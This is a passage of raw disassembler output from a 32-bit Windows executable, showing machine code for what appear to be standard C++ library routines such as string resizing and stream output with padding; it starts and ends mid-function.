  4047fc:	cc                   	int3
  4047fd:	cc                   	int3
  4047fe:	cc                   	int3
  4047ff:	cc                   	int3
  404800:	55                   	push   %ebp
  404801:	8b ec                	mov    %esp,%ebp
  404803:	83 ec 0c             	sub    $0xc,%esp
  404806:	8b 45 08             	mov    0x8(%ebp),%eax
  404809:	53                   	push   %ebx
  40480a:	56                   	push   %esi
  40480b:	8b f1                	mov    %ecx,%esi
  40480d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404810:	57                   	push   %edi
  404811:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404814:	8b 4e 14             	mov    0x14(%esi),%ecx
  404817:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40481a:	3b f9                	cmp    %ecx,%edi
  40481c:	77 26                	ja     0x404844
  40481e:	8b de                	mov    %esi,%ebx
  404820:	83 f9 10             	cmp    $0x10,%ecx
  404823:	72 02                	jb     0x404827
  404825:	8b 1e                	mov    (%esi),%ebx
  404827:	57                   	push   %edi
  404828:	50                   	push   %eax
  404829:	53                   	push   %ebx
  40482a:	89 7e 10             	mov    %edi,0x10(%esi)
  40482d:	e8 95 31 00 00       	call   0x4079c7
  404832:	83 c4 0c             	add    $0xc,%esp
  404835:	c6 04 1f 00          	movb   $0x0,(%edi,%ebx,1)
  404839:	8b c6                	mov    %esi,%eax
  40483b:	5f                   	pop    %edi
  40483c:	5e                   	pop    %esi
  40483d:	5b                   	pop    %ebx
  40483e:	8b e5                	mov    %ebp,%esp
  404840:	5d                   	pop    %ebp
  404841:	c2 08 00             	ret    $0x8
  404844:	81 ff ff ff ff 7f    	cmp    $0x7fffffff,%edi
  40484a:	0f 87 dd 00 00 00    	ja     0x40492d
  404850:	8b df                	mov    %edi,%ebx
  404852:	83 cb 0f             	or     $0xf,%ebx
  404855:	81 fb ff ff ff 7f    	cmp    $0x7fffffff,%ebx
  40485b:	76 07                	jbe    0x404864
  40485d:	bb ff ff ff 7f       	mov    $0x7fffffff,%ebx
  404862:	eb 1e                	jmp    0x404882
  404864:	8b d1                	mov    %ecx,%edx
  404866:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  40486b:	d1 ea                	shr    $1,%edx
  40486d:	2b c2                	sub    %edx,%eax
  40486f:	3b c8                	cmp    %eax,%ecx
  404871:	76 07                	jbe    0x40487a
  404873:	bb ff ff ff 7f       	mov    $0x7fffffff,%ebx
  404878:	eb 08                	jmp    0x404882
  40487a:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  40487d:	3b d8                	cmp    %eax,%ebx
  40487f:	0f 42 d8             	cmovb  %eax,%ebx
  404882:	33 c9                	xor    %ecx,%ecx
  404884:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  404887:	83 c3 01             	add    $0x1,%ebx
  40488a:	0f 92 c1             	setb   %cl
  40488d:	f7 d9                	neg    %ecx
  40488f:	0b cb                	or     %ebx,%ecx
  404891:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  404897:	72 23                	jb     0x4048bc
  404899:	8d 41 23             	lea    0x23(%ecx),%eax
  40489c:	3b c1                	cmp    %ecx,%eax
  40489e:	0f 86 8e 00 00 00    	jbe    0x404932
  4048a4:	50                   	push   %eax
  4048a5:	e8 dd 21 00 00       	call   0x406a87
  4048aa:	83 c4 04             	add    $0x4,%esp
  4048ad:	85 c0                	test   %eax,%eax
  4048af:	74 76                	je     0x404927
  4048b1:	8d 58 23             	lea    0x23(%eax),%ebx
  4048b4:	83 e3 e0             	and    $0xffffffe0,%ebx
  4048b7:	89 43 fc             	mov    %eax,-0x4(%ebx)
  4048ba:	eb 13                	jmp    0x4048cf
  4048bc:	85 c9                	test   %ecx,%ecx
  4048be:	74 0d                	je     0x4048cd
  4048c0:	51                   	push   %ecx
  4048c1:	e8 c1 21 00 00       	call   0x406a87
  4048c6:	83 c4 04             	add    $0x4,%esp
  4048c9:	8b d8                	mov    %eax,%ebx
  4048cb:	eb 02                	jmp    0x4048cf
  4048cd:	33 db                	xor    %ebx,%ebx
  4048cf:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4048d2:	57                   	push   %edi
  4048d3:	ff 75 f8             	push   -0x8(%ebp)
  4048d6:	89 7e 10             	mov    %edi,0x10(%esi)
  4048d9:	53                   	push   %ebx
  4048da:	89 46 14             	mov    %eax,0x14(%esi)
  4048dd:	e8 df 30 00 00       	call   0x4079c1
  4048e2:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4048e5:	83 c4 0c             	add    $0xc,%esp
  4048e8:	c6 04 1f 00          	movb   $0x0,(%edi,%ebx,1)
  4048ec:	83 f8 10             	cmp    $0x10,%eax
  4048ef:	72 29                	jb     0x40491a
  4048f1:	8d 48 01             	lea    0x1(%eax),%ecx
  4048f4:	8b 06                	mov    (%esi),%eax
  4048f6:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4048fc:	72 12                	jb     0x404910
  4048fe:	8b 50 fc             	mov    -0x4(%eax),%edx
  404901:	83 c1 23             	add    $0x23,%ecx
  404904:	2b c2                	sub    %edx,%eax
  404906:	83 c0 fc             	add    $0xfffffffc,%eax
  404909:	83 f8 1f             	cmp    $0x1f,%eax
  40490c:	77 19                	ja     0x404927
  40490e:	8b c2                	mov    %edx,%eax
  404910:	51                   	push   %ecx
  404911:	50                   	push   %eax
  404912:	e8 a5 21 00 00       	call   0x406abc
  404917:	83 c4 08             	add    $0x8,%esp
  40491a:	5f                   	pop    %edi
  40491b:	89 1e                	mov    %ebx,(%esi)
  40491d:	8b c6                	mov    %esi,%eax
  40491f:	5e                   	pop    %esi
  404920:	5b                   	pop    %ebx
  404921:	8b e5                	mov    %ebp,%esp
  404923:	5d                   	pop    %ebp
  404924:	c2 08 00             	ret    $0x8
  404927:	ff 15 80 91 40 00    	call   *0x409180
  40492d:	e8 3e c8 ff ff       	call   0x401170
  404932:	e8 99 c7 ff ff       	call   0x4010d0
  404937:	cc                   	int3
  404938:	cc                   	int3
  404939:	cc                   	int3
  40493a:	cc                   	int3
  40493b:	cc                   	int3
  40493c:	cc                   	int3
  40493d:	cc                   	int3
  40493e:	cc                   	int3
  40493f:	cc                   	int3
  404940:	55                   	push   %ebp
  404941:	8b ec                	mov    %esp,%ebp
  404943:	6a ff                	push   $0xffffffff
  404945:	68 60 7e 40 00       	push   $0x407e60
  40494a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404950:	50                   	push   %eax
  404951:	a1 04 c0 40 00       	mov    0x40c004,%eax
  404956:	33 c5                	xor    %ebp,%eax
  404958:	50                   	push   %eax
  404959:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40495c:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404962:	8b 09                	mov    (%ecx),%ecx
  404964:	8b 01                	mov    (%ecx),%eax
  404966:	8b 40 04             	mov    0x4(%eax),%eax
  404969:	8b 4c 08 38          	mov    0x38(%eax,%ecx,1),%ecx
  40496d:	85 c9                	test   %ecx,%ecx
  40496f:	74 05                	je     0x404976
  404971:	8b 01                	mov    (%ecx),%eax
  404973:	ff 50 08             	call   *0x8(%eax)
  404976:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404979:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404980:	59                   	pop    %ecx
  404981:	8b e5                	mov    %ebp,%esp
  404983:	5d                   	pop    %ebp
  404984:	c3                   	ret
  404985:	cc                   	int3
  404986:	cc                   	int3
  404987:	cc                   	int3
  404988:	cc                   	int3
  404989:	cc                   	int3
  40498a:	cc                   	int3
  40498b:	cc                   	int3
  40498c:	cc                   	int3
  40498d:	cc                   	int3
  40498e:	cc                   	int3
  40498f:	cc                   	int3
  404990:	68 f8 94 40 00       	push   $0x4094f8
  404995:	ff 15 f8 90 40 00    	call   *0x4090f8
  40499b:	cc                   	int3
  40499c:	cc                   	int3
  40499d:	cc                   	int3
  40499e:	cc                   	int3
  40499f:	cc                   	int3
  4049a0:	55                   	push   %ebp
  4049a1:	8b ec                	mov    %esp,%ebp
  4049a3:	83 e4 f8             	and    $0xfffffff8,%esp
  4049a6:	83 ec 08             	sub    $0x8,%esp
  4049a9:	8b c1                	mov    %ecx,%eax
  4049ab:	83 79 14 08          	cmpl   $0x8,0x14(%ecx)
  4049af:	72 02                	jb     0x4049b3
  4049b1:	8b 01                	mov    (%ecx),%eax
  4049b3:	ff 71 10             	push   0x10(%ecx)
  4049b6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4049b9:	50                   	push   %eax
  4049ba:	e8 51 14 00 00       	call   0x405e10
  4049bf:	8b 45 08             	mov    0x8(%ebp),%eax
  4049c2:	83 c4 08             	add    $0x8,%esp
  4049c5:	8b e5                	mov    %ebp,%esp
  4049c7:	5d                   	pop    %ebp
  4049c8:	c2 08 00             	ret    $0x8
  4049cb:	cc                   	int3
  4049cc:	cc                   	int3
  4049cd:	cc                   	int3
  4049ce:	cc                   	int3
  4049cf:	cc                   	int3
  4049d0:	55                   	push   %ebp
  4049d1:	8b ec                	mov    %esp,%ebp
  4049d3:	6a ff                	push   $0xffffffff
  4049d5:	68 9e 7e 40 00       	push   $0x407e9e
  4049da:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4049e0:	50                   	push   %eax
  4049e1:	83 ec 18             	sub    $0x18,%esp
  4049e4:	a1 04 c0 40 00       	mov    0x40c004,%eax
  4049e9:	33 c5                	xor    %ebp,%eax
  4049eb:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4049ee:	53                   	push   %ebx
  4049ef:	56                   	push   %esi
  4049f0:	57                   	push   %edi
  4049f1:	50                   	push   %eax
  4049f2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4049f5:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4049fb:	8b f2                	mov    %edx,%esi
  4049fd:	89 75 ec             	mov    %esi,-0x14(%ebp)
  404a00:	8b f9                	mov    %ecx,%edi
  404a02:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  404a05:	89 7d dc             	mov    %edi,-0x24(%ebp)
  404a08:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  404a0f:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  404a15:	c7 47 10 00 00 00 00 	movl   $0x0,0x10(%edi)
  404a1c:	c7 47 14 00 00 00 00 	movl   $0x0,0x14(%edi)
  404a23:	c7 47 10 00 00 00 00 	movl   $0x0,0x10(%edi)
  404a2a:	c7 47 14 0f 00 00 00 	movl   $0xf,0x14(%edi)
  404a31:	c6 07 00             	movb   $0x0,(%edi)
  404a34:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  404a3b:	8b 45 10             	mov    0x10(%ebp),%eax
  404a3e:	c7 45 e8 01 00 00 00 	movl   $0x1,-0x18(%ebp)
  404a45:	85 c0                	test   %eax,%eax
  404a47:	0f 84 9f 00 00 00    	je     0x404aec
  404a4d:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  404a52:	0f 87 b2 00 00 00    	ja     0x404b0a
  404a58:	6a 00                	push   $0x0
  404a5a:	6a 00                	push   $0x0
  404a5c:	50                   	push   %eax
  404a5d:	ff 75 0c             	push   0xc(%ebp)
  404a60:	56                   	push   %esi
  404a61:	e8 56 1c 00 00       	call   0x4066bc
  404a66:	8b d8                	mov    %eax,%ebx
  404a68:	85 d2                	test   %edx,%edx
  404a6a:	0f 85 9f 00 00 00    	jne    0x404b0f
  404a70:	8b 57 10             	mov    0x10(%edi),%edx
  404a73:	3b da                	cmp    %edx,%ebx
  404a75:	77 13                	ja     0x404a8a
  404a77:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  404a7b:	8b c7                	mov    %edi,%eax
  404a7d:	72 02                	jb     0x404a81
  404a7f:	8b 07                	mov    (%edi),%eax
  404a81:	89 5f 10             	mov    %ebx,0x10(%edi)
  404a84:	c6 04 18 00          	movb   $0x0,(%eax,%ebx,1)
  404a88:	eb 46                	jmp    0x404ad0
  404a8a:	8b 77 14             	mov    0x14(%edi),%esi
  404a8d:	8b cb                	mov    %ebx,%ecx
  404a8f:	8b c6                	mov    %esi,%eax
  404a91:	2b ca                	sub    %edx,%ecx
  404a93:	2b c2                	sub    %edx,%eax
  404a95:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  404a98:	3b c8                	cmp    %eax,%ecx
  404a9a:	77 24                	ja     0x404ac0
  404a9c:	89 5f 10             	mov    %ebx,0x10(%edi)
  404a9f:	8b c7                	mov    %edi,%eax
  404aa1:	83 fe 10             	cmp    $0x10,%esi
  404aa4:	72 02                	jb     0x404aa8
  404aa6:	8b 07                	mov    (%edi),%eax
  404aa8:	51                   	push   %ecx
  404aa9:	8d 34 10             	lea    (%eax,%edx,1),%esi
  404aac:	6a 00                	push   $0x0
  404aae:	56                   	push   %esi
  404aaf:	e8 ee 2b 00 00       	call   0x4076a2
  404ab4:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404ab7:	83 c4 0c             	add    $0xc,%esp
  404aba:	c6 04 06 00          	movb   $0x0,(%esi,%eax,1)
  404abe:	eb 0d                	jmp    0x404acd
  404ac0:	51                   	push   %ecx
  404ac1:	51                   	push   %ecx
  404ac2:	ff 75 dc             	push   -0x24(%ebp)
  404ac5:	51                   	push   %ecx
  404ac6:	8b cf                	mov    %edi,%ecx
  404ac8:	e8 23 0e 00 00       	call   0x4058f0
  404acd:	8b 75 ec             	mov    -0x14(%ebp),%esi
  404ad0:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  404ad4:	8b c7                	mov    %edi,%eax
  404ad6:	72 02                	jb     0x404ada
  404ad8:	8b 07                	mov    (%edi),%eax
  404ada:	53                   	push   %ebx
  404adb:	50                   	push   %eax
  404adc:	ff 75 10             	push   0x10(%ebp)
  404adf:	ff 75 0c             	push   0xc(%ebp)
  404ae2:	56                   	push   %esi
  404ae3:	e8 d4 1b 00 00       	call   0x4066bc
  404ae8:	85 d2                	test   %edx,%edx
  404aea:	75 2a                	jne    0x404b16
  404aec:	8b c7                	mov    %edi,%eax
  404aee:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404af1:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404af8:	59                   	pop    %ecx
  404af9:	5f                   	pop    %edi
  404afa:	5e                   	pop    %esi
  404afb:	5b                   	pop    %ebx
  404afc:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404aff:	33 cd                	xor    %ebp,%ecx
  404b01:	e8 73 1f 00 00       	call   0x406a79
  404b06:	8b e5                	mov    %ebp,%esp
  404b08:	5d                   	pop    %ebp
  404b09:	c3                   	ret
  404b0a:	e8 a1 ca ff ff       	call   0x4015b0
  404b0f:	8b ca                	mov    %edx,%ecx
  404b11:	e8 5a ce ff ff       	call   0x401970
  404b16:	8b ca                	mov    %edx,%ecx
  404b18:	e8 53 ce ff ff       	call   0x401970
  404b1d:	cc                   	int3
  404b1e:	cc                   	int3
  404b1f:	cc                   	int3
  404b20:	55                   	push   %ebp
  404b21:	8b ec                	mov    %esp,%ebp
  404b23:	6a ff                	push   $0xffffffff
  404b25:	68 08 7f 40 00       	push   $0x407f08
  404b2a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404b30:	50                   	push   %eax
  404b31:	81 ec 80 02 00 00    	sub    $0x280,%esp
  404b37:	a1 04 c0 40 00       	mov    0x40c004,%eax
  404b3c:	33 c5                	xor    %ebp,%eax
  404b3e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404b41:	53                   	push   %ebx
  404b42:	56                   	push   %esi
  404b43:	57                   	push   %edi
  404b44:	50                   	push   %eax
  404b45:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404b48:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404b4e:	8b d9                	mov    %ecx,%ebx
  404b50:	52                   	push   %edx
  404b51:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  404b57:	e8 04 d5 ff ff       	call   0x402060
  404b5c:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  404b63:	c7 85 94 fd ff ff ff 	movl   $0xffffffff,-0x26c(%ebp)
  404b6a:	ff ff ff 
  404b6d:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  404b73:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  404b77:	50                   	push   %eax
  404b78:	8d 85 94 fd ff ff    	lea    -0x26c(%ebp),%eax
  404b7e:	33 d2                	xor    %edx,%edx
  404b80:	50                   	push   %eax
  404b81:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  404b87:	e8 a4 e1 ff ff       	call   0x402d30
  404b8c:	8b c8                	mov    %eax,%ecx
  404b8e:	83 c4 08             	add    $0x8,%esp
  404b91:	85 c9                	test   %ecx,%ecx
  404b93:	75 09                	jne    0x404b9e
  404b95:	c6 85 74 fd ff ff 01 	movb   $0x1,-0x28c(%ebp)
  404b9c:	eb 0c                	jmp    0x404baa
  404b9e:	c6 85 74 fd ff ff 00 	movb   $0x0,-0x28c(%ebp)
  404ba5:	83 f9 12             	cmp    $0x12,%ecx
  404ba8:	75 02                	jne    0x404bac
  404baa:	33 c9                	xor    %ecx,%ecx
  404bac:	8b 85 74 fd ff ff    	mov    -0x28c(%ebp),%eax
  404bb2:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404bb5:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  404bb8:	89 8d 78 fd ff ff    	mov    %ecx,-0x288(%ebp)
  404bbe:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  404bc5:	84 c0                	test   %al,%al
  404bc7:	74 73                	je     0x404c3c
  404bc9:	6a 50                	push   $0x50
  404bcb:	e8 b7 1e 00 00       	call   0x406a87
  404bd0:	8b f8                	mov    %eax,%edi
  404bd2:	89 bd 78 fd ff ff    	mov    %edi,-0x288(%ebp)
  404bd8:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  404bdc:	8d 85 7c fd ff ff    	lea    -0x284(%ebp),%eax
  404be2:	0f 57 c0             	xorps  %xmm0,%xmm0
  404be5:	8d 77 10             	lea    0x10(%edi),%esi
  404be8:	66 0f d6 07          	movq   %xmm0,(%edi)
  404bec:	8b ce                	mov    %esi,%ecx
  404bee:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  404bf5:	50                   	push   %eax
  404bf6:	c7 47 04 01 00 00 00 	movl   $0x1,0x4(%edi)
  404bfd:	c7 47 08 01 00 00 00 	movl   $0x1,0x8(%edi)
  404c04:	c7 07 c8 95 40 00    	movl   $0x4095c8,(%edi)
  404c0a:	e8 c1 e3 ff ff       	call   0x402fd0
  404c0f:	89 33                	mov    %esi,(%ebx)
  404c11:	8b 73 04             	mov    0x4(%ebx),%esi
  404c14:	89 7b 04             	mov    %edi,0x4(%ebx)
  404c17:	85 f6                	test   %esi,%esi
  404c19:	74 21                	je     0x404c3c
  404c1b:	83 cf ff             	or     $0xffffffff,%edi
  404c1e:	8b c7                	mov    %edi,%eax
  404c20:	f0 0f c1 46 04       	lock xadd %eax,0x4(%esi)
  404c25:	75 15                	jne    0x404c3c
  404c27:	8b 06                	mov    (%esi),%eax
  404c29:	8b ce                	mov    %esi,%ecx
  404c2b:	ff 10                	call   *(%eax)
  404c2d:	f0 0f c1 7e 08       	lock xadd %edi,0x8(%esi)
  404c32:	4f                   	dec    %edi
  404c33:	75 07                	jne    0x404c3c
  404c35:	8b 06                	mov    (%esi),%eax
  404c37:	8b ce                	mov    %esi,%ecx
  404c39:	ff 50 04             	call   *0x4(%eax)
  404c3c:	ff b5 94 fd ff ff    	push   -0x26c(%ebp)
  404c42:	8b 75 ec             	mov    -0x14(%ebp),%esi
  404c45:	e8 02 1b 00 00       	call   0x40674c
  404c4a:	8b 8d 90 fd ff ff    	mov    -0x270(%ebp),%ecx
  404c50:	83 f9 08             	cmp    $0x8,%ecx
  404c53:	72 37                	jb     0x404c8c
  404c55:	8b 95 7c fd ff ff    	mov    -0x284(%ebp),%edx
  404c5b:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  404c62:	8b c2                	mov    %edx,%eax
  404c64:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  404c6a:	72 16                	jb     0x404c82
  404c6c:	8b 50 fc             	mov    -0x4(%eax),%edx
  404c6f:	83 c1 23             	add    $0x23,%ecx
  404c72:	2b c2                	sub    %edx,%eax
  404c74:	83 c0 fc             	add    $0xfffffffc,%eax
  404c77:	83 f8 1f             	cmp    $0x1f,%eax
  404c7a:	76 06                	jbe    0x404c82
  404c7c:	ff 15 80 91 40 00    	call   *0x409180
  404c82:	51                   	push   %ecx
  404c83:	52                   	push   %edx
  404c84:	e8 33 1e 00 00       	call   0x406abc
  404c89:	83 c4 08             	add    $0x8,%esp
  404c8c:	8b c6                	mov    %esi,%eax
  404c8e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404c91:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404c98:	59                   	pop    %ecx
  404c99:	5f                   	pop    %edi
  404c9a:	5e                   	pop    %esi
  404c9b:	5b                   	pop    %ebx
  404c9c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404c9f:	33 cd                	xor    %ebp,%ecx
  404ca1:	e8 d3 1d 00 00       	call   0x406a79
  404ca6:	8b e5                	mov    %ebp,%esp
  404ca8:	5d                   	pop    %ebp
  404ca9:	c3                   	ret
  404caa:	cc                   	int3
  404cab:	cc                   	int3
  404cac:	cc                   	int3
  404cad:	cc                   	int3
  404cae:	cc                   	int3
  404caf:	cc                   	int3
  404cb0:	55                   	push   %ebp
  404cb1:	8b ec                	mov    %esp,%ebp
  404cb3:	6a ff                	push   $0xffffffff
  404cb5:	68 55 7f 40 00       	push   $0x407f55
  404cba:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404cc0:	50                   	push   %eax
  404cc1:	83 ec 20             	sub    $0x20,%esp
  404cc4:	53                   	push   %ebx
  404cc5:	56                   	push   %esi
  404cc6:	57                   	push   %edi
  404cc7:	a1 04 c0 40 00       	mov    0x40c004,%eax
  404ccc:	33 c5                	xor    %ebp,%eax
  404cce:	50                   	push   %eax
  404ccf:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404cd2:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404cd8:	89 65 f0             	mov    %esp,-0x10(%ebp)
  404cdb:	89 55 dc             	mov    %edx,-0x24(%ebp)
  404cde:	8b d9                	mov    %ecx,%ebx
  404ce0:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  404ce3:	8b ca                	mov    %edx,%ecx
  404ce5:	33 c0                	xor    %eax,%eax
  404ce7:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404cea:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404ced:	8d 71 01             	lea    0x1(%ecx),%esi
  404cf0:	8a 01                	mov    (%ecx),%al
  404cf2:	41                   	inc    %ecx
  404cf3:	84 c0                	test   %al,%al
  404cf5:	75 f9                	jne    0x404cf0
  404cf7:	8b 03                	mov    (%ebx),%eax
  404cf9:	2b ce                	sub    %esi,%ecx
  404cfb:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  404cfe:	8b 40 04             	mov    0x4(%eax),%eax
  404d01:	8b 7c 18 24          	mov    0x24(%eax,%ebx,1),%edi
  404d05:	8b 74 18 20          	mov    0x20(%eax,%ebx,1),%esi
  404d09:	85 ff                	test   %edi,%edi
  404d0b:	7c 17                	jl     0x404d24
  404d0d:	7f 0e                	jg     0x404d1d
  404d0f:	85 f6                	test   %esi,%esi
  404d11:	74 11                	je     0x404d24
  404d13:	85 ff                	test   %edi,%edi
  404d15:	7c 0d                	jl     0x404d24
  404d17:	7f 04                	jg     0x404d1d
  404d19:	3b f1                	cmp    %ecx,%esi
  404d1b:	76 07                	jbe    0x404d24
  404d1d:	2b f1                	sub    %ecx,%esi
  404d1f:	83 df 00             	sbb    $0x0,%edi
  404d22:	eb 0e                	jmp    0x404d32
  404d24:	0f 57 c0             	xorps  %xmm0,%xmm0
  404d27:	66 0f 13 45 d4       	movlpd %xmm0,-0x2c(%ebp)
  404d2c:	8b 7d d8             	mov    -0x28(%ebp),%edi
  404d2f:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  404d32:	8b 4c 18 38          	mov    0x38(%eax,%ebx,1),%ecx
  404d36:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  404d39:	85 c9                	test   %ecx,%ecx
  404d3b:	74 05                	je     0x404d42
  404d3d:	8b 01                	mov    (%ecx),%eax
  404d3f:	ff 50 04             	call   *0x4(%eax)
  404d42:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  404d49:	8b 0b                	mov    (%ebx),%ecx
  404d4b:	8b 41 04             	mov    0x4(%ecx),%eax
  404d4e:	03 c3                	add    %ebx,%eax
  404d50:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  404d54:	74 04                	je     0x404d5a
  404d56:	32 c0                	xor    %al,%al
  404d58:	eb 24                	jmp    0x404d7e
  404d5a:	8b 40 3c             	mov    0x3c(%eax),%eax
  404d5d:	85 c0                	test   %eax,%eax
  404d5f:	74 1b                	je     0x404d7c
  404d61:	3b c3                	cmp    %ebx,%eax
  404d63:	74 17                	je     0x404d7c
  404d65:	8b c8                	mov    %eax,%ecx
  404d67:	ff 15 b0 90 40 00    	call   *0x4090b0
  404d6d:	8b 0b                	mov    (%ebx),%ecx
  404d6f:	8b 41 04             	mov    0x4(%ecx),%eax
  404d72:	83 7c 18 0c 00       	cmpl   $0x0,0xc(%eax,%ebx,1)
  404d77:	0f 94 c0             	sete   %al
  404d7a:	eb 02                	jmp    0x404d7e
  404d7c:	b0 01                	mov    $0x1,%al
  404d7e:	88 45 d8             	mov    %al,-0x28(%ebp)
  404d81:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  404d88:	84 c0                	test   %al,%al
  404d8a:	75 0a                	jne    0x404d96
  404d8c:	ba 04 00 00 00       	mov    $0x4,%edx
  404d91:	e9 df 00 00 00       	jmp    0x404e75
  404d96:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  404d9a:	8b 41 04             	mov    0x4(%ecx),%eax
  404d9d:	8b 44 18 14          	mov    0x14(%eax,%ebx,1),%eax
  404da1:	25 c0 01 00 00       	and    $0x1c0,%eax
  404da6:	83 f8 40             	cmp    $0x40,%eax
  404da9:	74 35                	je     0x404de0
  404dab:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  404db0:	85 ff                	test   %edi,%edi
  404db2:	7c 2c                	jl     0x404de0
  404db4:	7f 04                	jg     0x404dba
  404db6:	85 f6                	test   %esi,%esi
  404db8:	74 26                	je     0x404de0
  404dba:	8b 03                	mov    (%ebx),%eax
  404dbc:	8b 40 04             	mov    0x4(%eax),%eax
  404dbf:	8b 4c 18 38          	mov    0x38(%eax,%ebx,1),%ecx
  404dc3:	8a 44 18 40          	mov    0x40(%eax,%ebx,1),%al
  404dc7:	50                   	push   %eax
  404dc8:	ff 15 c0 90 40 00    	call   *0x4090c0
  404dce:	83 f8 ff             	cmp    $0xffffffff,%eax
  404dd1:	75 05                	jne    0x404dd8
  404dd3:	8d 50 05             	lea    0x5(%eax),%edx
  404dd6:	eb 2d                	jmp    0x404e05
  404dd8:	83 c6 ff             	add    $0xffffffff,%esi
  404ddb:	83 d7 ff             	adc    $0xffffffff,%edi
  404dde:	eb d0                	jmp    0x404db0
  404de0:	8b 03                	mov    (%ebx),%eax
  404de2:	6a 00                	push   $0x0
  404de4:	ff 75 e4             	push   -0x1c(%ebp)
  404de7:	8b 40 04             	mov    0x4(%eax),%eax
  404dea:	ff 75 dc             	push   -0x24(%ebp)
  404ded:	8b 4c 18 38          	mov    0x38(%eax,%ebx,1),%ecx
  404df1:	ff 15 a0 90 40 00    	call   *0x4090a0
  404df7:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  404dfa:	75 04                	jne    0x404e00
  404dfc:	85 d2                	test   %edx,%edx
  404dfe:	74 1c                	je     0x404e1c
  404e00:	33 d2                	xor    %edx,%edx
  404e02:	83 ca 04             	or     $0x4,%edx
  404e05:	8b 03                	mov    (%ebx),%eax
  404e07:	8b 40 04             	mov    0x4(%eax),%eax
  404e0a:	c7 44 18 20 00 00 00 	movl   $0x0,0x20(%eax,%ebx,1)
  404e11:	00 
  404e12:	c7 44 18 24 00 00 00 	movl   $0x0,0x24(%eax,%ebx,1)
  404e19:	00 
  404e1a:	eb 52                	jmp    0x404e6e
  404e1c:	33 d2                	xor    %edx,%edx
  404e1e:	66 90                	xchg   %ax,%ax
  404e20:	85 ff                	test   %edi,%edi
  404e22:	7c e1                	jl     0x404e05
  404e24:	7f 04                	jg     0x404e2a
  404e26:	85 f6                	test   %esi,%esi
  404e28:	74 db                	je     0x404e05
  404e2a:	8b 03                	mov    (%ebx),%eax
  404e2c:	8b 40 04             	mov    0x4(%eax),%eax
  404e2f:	8b 4c 18 38          	mov    0x38(%eax,%ebx,1),%ecx
  404e33:	8a 44 18 40          	mov    0x40(%eax,%ebx,1),%al
  404e37:	50                   	push   %eax
  404e38:	ff 15 c0 90 40 00    	call   *0x4090c0
  404e3e:	8b 55 ec             	mov    -0x14(%ebp),%edx
  404e41:	83 f8 ff             	cmp    $0xffffffff,%eax
  404e44:	74 bc                	je     0x404e02
  404e46:	83 c6 ff             	add    $0xffffffff,%esi
  404e49:	83 d7 ff             	adc    $0xffffffff,%edi
  404e4c:	eb d2                	jmp    0x404e20
  404e4e:	8b 55 e0             	mov    -0x20(%ebp),%edx
  404e51:	6a 01                	push   $0x1
  404e53:	6a 04                	push   $0x4
